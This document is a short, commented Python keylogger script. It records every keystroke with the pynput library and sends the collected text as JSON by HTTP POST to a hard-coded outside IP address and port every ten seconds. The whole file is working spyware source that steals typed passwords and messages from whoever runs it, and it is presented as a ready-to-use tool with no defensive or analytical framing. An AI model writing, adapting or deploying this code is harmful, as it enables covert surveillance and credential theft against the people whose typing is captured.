# Step 1: Install the 'pynput' library using the following command: pip install pynput
# Import the 'keyboard' module from 'pynput' for keyboard input handling.
from pynput import keyboard
# Import the 'requests' library for making POST requests to the server.
import requests
# Import the 'json' module to convert a dictionary into a JSON string.
import json
# The 'Timer' module is part of the 'threading' package.
import threading

# Create a global variable 'text' to store a string of keystrokes that will be sent to the server.
text = ""

# Define server and IP address values here.
ip_address = "109.74.200.23"
port_number = "8080"
# Set the time interval in seconds for the code execution.
time_interval = 10

def send_post_req():
    try:
        # Convert the Python object into a JSON string so that it can be POSTed to the server.
        # The expected format is {"keyboardData" : "<value_of_text>"}
        payload = json.dumps({"keyboardData" : text})
        # Send a POST Request to the server with the specified IP address and port as defined in the Express server code.
        # Specify the MIME Type for JSON as 'application/json' because we are sending JSON data.
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})
        # Set up a timer function to run every <time_interval> seconds. 'send_post_req' is a recursive function and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, send_post_req)
        # Start the timer thread.
        timer.start()
    except:
        print("Unable to complete the request!")

# Log a key only when it is released to consider modifier keys.
def on_press(key):
    global text

    # Handle key logging based on key presses and releases.
    # For details on the different keys that can be logged, refer to:
    # https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # Explicitly convert the key object to a string and append it to the in-memory string.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and the 'on_press' callback will be invoked from this thread.
# In the 'on_press' function, we specify how to handle different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # Start by sending the POST request to the server.
    send_post_req()
    # Join the listener to continuously monitor keyboard input.
    listener.join()
